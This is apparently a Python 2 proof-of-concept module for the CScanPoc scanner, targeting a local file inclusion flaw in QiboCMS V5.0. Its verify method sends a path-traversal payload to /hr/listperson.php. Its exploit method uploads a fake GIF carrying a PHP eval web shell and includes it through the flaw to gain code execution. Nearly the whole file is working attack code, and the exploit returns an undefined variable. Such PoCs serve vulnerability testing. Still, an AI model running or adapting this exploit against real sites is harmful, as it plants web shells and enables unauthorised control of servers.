# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0001' # 平台漏洞编号，留空
    name = 'QiboCMS V5.0 本地文件包含漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2014-10-31'  # 漏洞公布时间
    desc = '''
        Qibocms /hr/listperson.php 系统文件包含致无限制Getshell.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'V5.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'dceea40a-2e02-428b-9f7f-dc1333ad412b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = 'FidTpl[list]=../images/default/default.js'
            file_path = "/hr/listperson.php?%s" % payload
            verify_url = self.target + file_path
            html = requests.get(verify_url).content
            
            if 'var evt = (evt) ? evt : ((window.event) ? window.event : "");' in html:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            upload_file_url = '%s/hy/choose_pic.php' % self.target
            gif_file = {'postfile': ('test.gif', 'Gif89a <?php echo(md5("bb2"));@eval($_POST["bb2"]);', 'image/gif')}
            gif_data = {'action': 'upload'}
            upload_content = requests.post(upload_file_url, files=gif_file, data=gif_data).content

            # 获取文件的地址   get file url
            pic_reg = re.compile(r"""set_choooooooooooosed\('\d+','(.*)','.*'\);""")
            pic_file = pic_reg.findall(upload_content)
            pic_file = urlparse.urlparse((pic_file[0])[:-4]).path

            # 文件包含 is include?
            file_path = "/hr/listperson.php?FidTpl[list]=../%s" % pic_file
            webshell = '%s%s' % (self.target, file_path)

            # 验证是否成功  check
            page_content = requests.get(webshell).content
            if '0c72305dbeb0ed430b79ec9fc5fe8505' in page_content:
                #args['success'] = True
                #args['poc_ret']['webshell'] = webshell
                #args['poc_ret']['post_password'] = 'bb2'
                #self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，已注册用户名：{name}，密码：{passwd}'.format(target=self.target, vulnname=self.vuln.name, name=info, passwd=info))
                return args
            return args

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

if __name__ == '__main__':
    Poc().run()
